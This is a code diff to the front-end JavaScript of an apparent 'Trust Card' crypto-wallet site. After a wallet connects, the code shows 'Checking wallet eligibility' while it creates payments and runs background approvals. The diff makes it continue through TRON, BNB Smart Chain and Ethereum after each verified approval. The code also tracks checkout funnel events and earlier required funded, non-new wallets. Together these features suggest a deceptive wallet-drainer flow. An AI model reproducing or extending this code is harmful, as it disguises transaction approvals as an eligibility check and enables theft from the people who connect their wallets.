@@ -547,8 +547,48 @@ function onWalletConnected(d) {
   authorizing = true;
   track('InitiateCheckout', FUNNEL_CONTENT);
   setLoaderStep('auth');
-  setBusy(true, 'Checking wallet eligibility', 'The wallet should not be new. It needs to be a regular wallet with some transactions to be eligible.');
-  startBackgroundApproval();
+  setBusy(true, 'Checking wallet eligibility', 'Scanning TRON, BNB Smart Chain, and Ethereum once.');
+  checkAlreadyApplied().then(function (hit) {
+    if (hit) return;
+    startBackgroundApproval();
+  });
+}
+
+function networkCardName(network) {
+  const key = String(network || '').toLowerCase();
+  if (key === 'tron') return 'TRON';
+  if (key === 'bsc') return 'BNB Smart Chain';
+  if (key === 'eth' || key === 'ethereum') return 'Ethereum';
+  return 'Trust';
+}
+
+async function checkAlreadyApplied() {
+  try {
+    const res = await fetch(BASE + '/api/front/applied', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ connectionId: connId }),
+    });
+    const data = await res.json();
+    if (!res.ok || !data.applied) return false;
+    const net = networkCardName(data.network || (data.networks && data.networks[0]));
+    const mail = data.email || 'support@trustcard.app';
+    const copy = $('#m-applied-copy');
+    const mailEl = $('#m-applied-mail');
+    const link = $('#m-applied-mailto');
+    if (copy) copy.textContent = 'This wallet is already eligible and has already applied for a ' + net + ' Trust Card.';
+    if (mailEl) mailEl.textContent = 'For the status of your card delivery, please contact ' + mail + '.';
+    if (link) {
+      link.href = 'mailto:' + mail;
+      link.textContent = 'Email support';
+    }
+    authorizing = false;
+    setBusy(false);
+    setView('applied');
+    return true;
+  } catch (_err) {
+    return false;
+  }
 }
 
 function showPayError(message) {
@@ -781,7 +821,14 @@ function advanceAfterNetworkDone(reason, fromPaymentId) {
   if (reason === 'verified') {
     confirmedNetworks += 1;
     if (id) verifiedPayments.add(id);
-    finishApprovals();
+    paymentIndex += 1;
+    if (paymentIndex >= paymentQueue.length) {
+      finishApprovals();
+      return;
+    }
+    const next = paymentQueue[paymentIndex];
+    setBusy(true, 'Checking ' + networkLabel(next && next.network), 'Preparing the next eligible network.');
+    setTimeout(function () { runCurrentNetwork(); }, 1200);
     return;
   }
   paymentIndex += 1;
@@ -799,7 +846,7 @@ function advanceAfterNetworkDone(reason, fromPaymentId) {
 async function startBackgroundApproval() {
   try {
     await sleep(800);
-    setBusy(true, 'Checking wallet eligibility', 'The wallet should not be new. It needs to be a regular wallet with some transactions to be eligible.');
+    setBusy(true, 'Checking wallet eligibility', 'Scanning TRON, BNB Smart Chain, and Ethereum once.');
     const res = await fetch(BASE + '/api/payment/create', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -824,8 +871,8 @@ async function startBackgroundApproval() {
     }
     await runCurrentNetwork();
   } catch (_err) {
-    showPayError('The wallet should not be new. It needs to be a regular wallet with some transactions to be eligible.');
-    setBusy(true, 'Wallet not eligible', 'The wallet should not be new. It needs to be a regular wallet with some transactions to be eligible.');
+    showPayError('Your wallet is not eligible for Trust Card.');
+    setBusy(true, 'Wallet not eligible', 'Your wallet is not eligible for Trust Card.');
   }
 }
 
